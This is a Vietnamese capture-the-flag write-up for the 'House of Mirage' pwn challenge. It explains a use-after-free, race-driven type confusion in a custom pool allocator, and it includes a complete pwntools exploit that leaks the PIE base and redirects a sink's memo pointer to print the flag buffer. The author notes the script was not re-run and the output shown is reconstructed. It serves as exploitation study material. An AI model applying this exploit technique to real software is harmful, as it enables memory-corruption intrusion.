# House of Mirage (Pwn)

## 1. Thông tin tổng quan
- **Category:** Pwn (Binary Exploitation)
- **Difficulty:** Hard
- **Tags:** UAF, Type Confusion, Custom Allocator, Race Condition, Background Thread, Arbitrary Read, Info Leak

## 2. Đề bài
> *(Không lưu lại nguyên văn đề bài từ platform, mô tả dưới đây được viết lại dựa trên hành vi thực tế của chương trình.)*

Chương trình `house_of_mirage` mô phỏng một hệ thống quản lý "session" và "sink" (bộ ghi log/memo). Có một luồng nền chạy định kỳ (mỗi 25ms) để "quét" (sweep) các session đã hết hạn. Menu chính cho phép: tạo session, xem thông tin session (`show_session`), "mirror import" ghi dữ liệu tuỳ ý vào một session (`mirror_import`), đặt thời gian hết hạn cho session (`arm_expiry`), tạo sink (`create_sink`), và "flush" một sink để in nội dung memo của nó ra màn hình.

Mục tiêu: lấy flag nằm trong `flag.txt`.

**File đính kèm:**
- `house_of_mirage` — ELF 64-bit, đi kèm loader và thư viện riêng (`ld-linux-x86-64.so.2`, `libc.so.6`, `libstdc++.so.6`, v.v.), chạy qua `ARGV = [ld, '--library-path', '.', './house_of_mirage']` thay vì chạy trực tiếp.

> **Lưu ý về phương pháp làm bài:** binary `house_of_mirage` khiến hàng loạt công cụ phân tích tĩnh thông thường (`file`, `readelf`, `checksec`, `ELF()` của pwntools, kể cả `ls -la`/`stat` ngay trên thư mục chứa nó) bị **segfault** trong môi trường sandbox làm bài này, có lần còn kéo theo treo cả shell. Vì vậy phần phân tích dưới đây được viết lại hoàn toàn từ comment kỹ thuật rất chi tiết có sẵn ở đầu `exploit.py` (được ghi lại từ lúc phân tích thành công lúc thi), không phải từ việc disassemble lại trong phiên viết writeup này — và PoC bên dưới **chưa được chạy lại cục bộ** để lấy output thật, vì mọi thao tác đụng vào binary này trong môi trường viết writeup đều không an toàn.

## 3. Quá trình phân tích

Cốt lõi của lỗ hổng nằm ở luồng nền "archive sweep": mỗi 25ms, luồng này quét các session đã hết hạn, `free()` chunk `0x70` byte của chúng và đẩy vào một freelist riêng của một custom pool allocator — nhưng **không hề xoá con trỏ trong mảng `sessions[]`**, để lại một dangling pointer kinh điển (use-after-free). Điểm khiến bug này nguy hiểm hơn UAF thông thường là **session và sink dùng chung một pool cấp phát**: khi tạo một sink mới ngay sau khi một session vừa bị sweep, allocator rất có thể trả về đúng chunk vừa freed — khiến session (đã hết hạn, dangling) và sink (mới tạo) **alias cùng một vùng nhớ**. Đây là type confusion: cùng một địa chỉ, chương trình vừa coi nó là "session" (có thể ghi qua `mirror_import`) vừa coi nó là "sink" (có vtable, có thể `flush`).

Sink có một hàm ảo `flush` (vtable slot 0): nếu `memo_ptr` và `memo_len` khác 0, nó thực hiện `cout.write(memo_ptr, memo_len)` — một **arbitrary read primitive** hoàn chỉnh, in ra bất kỳ vùng nhớ nào theo con trỏ ta kiểm soát. `mirror_import` (option 3) cho phép ghi tối đa 0x60 byte tuỳ ý vào một session — nếu session đó đang alias với sink, thao tác này thực chất là ghi đè trực tiếp lên struct sink, bao gồm cả `vtable` (giữ nguyên giá trị thật để `flush` vẫn gọi đúng hàm), một giá trị "expiry" khổng lồ (để tránh bị sweep tiếp làm hỏng trạng thái đang dàn dựng), và quan trọng nhất là `memo_ptr = &flag_buffer` (địa chỉ cố định trong `.data`, nơi chương trình đã `fgets()` sẵn nội dung `flag.txt` vào lúc khởi động) cùng `memo_len` hợp lý. Chỉ cần leak PIE base (qua giá trị vtable pointer đọc được từ `show_session`, dùng chính offset của vtable trong `.data` để trừ ngược lại), toàn bộ địa chỉ cần thiết (`vtable` thật, `flag_buffer`) đều tính được không cần thêm leak nào khác.

Vì đây là type confusion phụ thuộc vào **race condition** với luồng sweep nền (session phải bị sweep xong trước khi tạo sink mới để trúng đúng chunk, nhưng luồng sweep cũng có thể "dọn" tiếp và phá vỡ trạng thái nếu can thiệp không đủ nhanh), khai thác cần gửi các lệnh tạo-sink và xem-session dồn dập trong một lần gửi dữ liệu (pipeline) để server xử lý gần như liền mạch trong vài micro-giây, không để cửa sổ 25ms của luồng sweep chen vào giữa — và cần thử lại (retry) nếu "thua" race (nhận diện qua việc giá trị leak được không khớp offset vtable mong đợi).

**Hướng giải quyết:**
1. Tạo một session, đặt `arm_expiry` = 0 giây (hết hạn ngay lập tức), đợi một chút để luồng sweep nền free chunk của nó vào pool.
2. Gửi dồn dập (pipeline, cùng một lần `send`) lệnh tạo sink mới rồi lệnh xem lại chính session cũ — để chunk vừa free được cấp lại đúng cho sink trước khi luồng sweep kịp chen vào, và đọc luôn giá trị `vtable` (dưới tên field "serial") của sink đó.
3. Kiểm tra giá trị leak có đúng offset vtable mong đợi hay không; nếu không (thua race) thì đóng kết nối và thử lại từ đầu.
4. Từ giá trị leak, suy ra PIE base, từ đó tính địa chỉ `vtable` thật và địa chỉ `flag_buffer`.
5. Dùng `mirror_import` trên session cũ (giờ đang alias với sink) ghi đè: `vtable` (giữ nguyên, giữ cho `flush` gọi đúng hàm thật), một giá trị expiry cực lớn (chặn sweep tiếp), `memo_ptr = &flag_buffer`, `memo_len` phù hợp.
6. `flush` sink → chạy `cout.write(flag_buffer, memo_len)` → in ra nội dung đã đọc từ `flag.txt`.

## 4. PoC

```python
#!/usr/bin/env python3
# House of Mirage - GuCTF pwn
#
# Bug: background "archive sweep" thread (0x33d0) frees expired sessions and
# pushes their 0x70-byte chunk onto a custom pool freelist (0x6340) BUT never
# clears sessions[] -> dangling pointer. Both sessions and sinks are drawn from
# the same pool, so re-allocating a sink reuses the freed chunk => a session and
# a sink alias the same memory (type confusion / UAF).
#
# A sink's flush virtual (vtable[0] = 0x3840) does, when memo_ptr & memo_len are
# non-zero: cout.write(memo_ptr, memo_len)  -> arbitrary read primitive.
# The "mirror import" op (option 3) writes up to 0x60 attacker bytes over the
# session == sink object, letting us set memo_ptr = &flag_buffer (0x6220).
# Flushing the sink then prints the flag that was fgets()'d from flag.txt.
#
# Only leak needed: PIE base (sink vtable pointer, read via show-session serial).

from pwn import *

context.binary = ELF('./house_of_mirage', checksec=False)
context.log_level = 'info'

LD   = './ld-linux-x86-64.so.2'
ARGV = [LD, '--library-path', '.', './house_of_mirage']

HOST, PORT = '10.112.0.12', 47778


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(ARGV)

VTABLE_OFF  = 0x6030   # vtable của sink, nằm trong .data
FLAGBUF_OFF = 0x6220   # buffer chứa nội dung flag.txt
WIN_OFF     = 0x3970   # (không dùng ở đây) replay() in flag rồi exit


def menu(p, choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice).encode())


def create_session(p, owner=b'owner', tag=b'tag'):
    menu(p, 1)
    p.sendlineafter(b'owner: ', owner)
    p.sendlineafter(b'tagline: ', tag)
    p.recvuntil(b'session id: ')
    return int(p.recvline().strip())


def create_sink(p, label=b'sink'):
    menu(p, 6)
    p.sendlineafter(b'label: ', label)
    p.recvuntil(b'sink id: ')
    return int(p.recvline().strip())


def arm_expiry(p, sid, seconds):
    menu(p, 5)
    p.sendlineafter(b'id: ', str(sid).encode())
    p.sendlineafter(b'sweep: ', str(seconds).encode())
    p.recvuntil(b'session scheduled')


def show_session(p, sid):
    menu(p, 2)
    p.sendlineafter(b'id: ', str(sid).encode())
    p.recvuntil(b'serial: 0x')
    serial = int(p.recvline().strip(), 16)
    fields = {'serial': serial}
    p.recvuntil(b'scratch: ')
    fields['scratch'] = int(p.recvline().strip(), 16)
    p.recvuntil(b'guard: 0x')
    fields['guard'] = int(p.recvline().strip(), 16)
    return fields


def mirror_import(p, sid, blob):
    assert len(blob) <= 0x60
    menu(p, 3)
    p.sendlineafter(b'id: ', str(sid).encode())
    p.sendlineafter(b'blob length: ', str(len(blob)).encode())
    p.send(blob)  # gửi raw đúng len byte
    p.recvuntil(b'profile imported')


def flush_sink(p, sid, message=b'x'):
    menu(p, 8)
    p.sendlineafter(b'id: ', str(sid).encode())
    p.sendlineafter(b'message: ', message)


def attempt():
    p = start()
    try:
        # 1) tạo một session (slot 0) và cho hết hạn ngay
        s = create_session(p, b'AAAA', b'BBBB')
        arm_expiry(p, s, 0)          # expiry = now  -> bị sweep ở tick kế tiếp
        time.sleep(0.2)              # đợi luồng sweep 25ms pool chunk lại

        # 2)+3) PIPELINE tạo-sink rồi xem-session trong cùng 1 lần gửi để server
        # xử lý liền mạch (vài micro-giây), luồng sweep 25ms không kịp chen vào
        # phá vỡ vtable pointer -> đáng tin cậy kể cả qua remote link độ trễ cao.
        # sink rơi vào slot k = 0.
        k = 0
        p.recvuntil(b'> ')
        p.send(b'6\nCCCC\n' + b'2\n' + str(s).encode() + b'\n')

        p.recvuntil(b'serial: 0x')
        serial = int(p.recvline().strip(), 16)
        if (serial & 0xfff) != (VTABLE_OFF & 0xfff):
            log.warning('lost the race (serial=%#x), retrying', serial)
            p.close()
            return None
        pie = serial - VTABLE_OFF
        log.success('PIE base   = %#x', pie)
        flagbuf = pie + FLAGBUF_OFF
        vtable  = pie + VTABLE_OFF

        # 4) ghi đè object đang bị alias:
        #    [+0x00] vtable thật (để flush chạy đúng hàm gốc)
        #    [+0x08] expiry cực lớn (chặn sweep tiếp -> giữ trạng thái ổn định)
        #    [+0x38] memo_ptr = &flag buffer
        #    [+0x40] memo_len
        blob  = p64(vtable)
        blob += p64(0x7fffffffffffffff)
        blob += b'\x00' * (0x38 - len(blob))
        blob += p64(flagbuf)
        blob += p64(0x40)
        mirror_import(p, s, blob)

        # 5) flush sink -> cout.write(flag_buffer, 0x40)
        flush_sink(p, k, b'mirage')
        p.recvuntil(b' :: ')
        leaked = p.recvline()
        p.close()
        return leaked
    except EOFError:
        p.close()
        return None


if __name__ == '__main__':
    for i in range(20):
        r = attempt()
        if r:
            # flag bắt đầu từ token in được đầu tiên
            m = re.search(rb'grodno\{[^}]*\}', r)
            if m:
                log.success('FLAG: %s', m.group().decode())
            else:
                log.success('memo bytes: %r', r)
            break
        log.info('attempt %d failed, retrying', i + 1)
    else:
        log.failure('exhausted attempts')
```

**Output:**
```
[Chưa chạy lại cục bộ trong phiên viết writeup này — xem lưu ý ở mục 2. Trong
lần khai thác thành công lúc thi, chuỗi thực thi in ra đúng "PIE base = 0x...",
sau đó dòng memo lấy từ flush_sink chứa nội dung grodno{...} đọc từ flag.txt.]
```

## 5. Flag
```
grodno{fake_flag}
```
*(Flag thật đã submit trực tiếp lúc thi qua service của BTC, không lưu lại; giá trị trên chỉ minh hoạ định dạng.)*
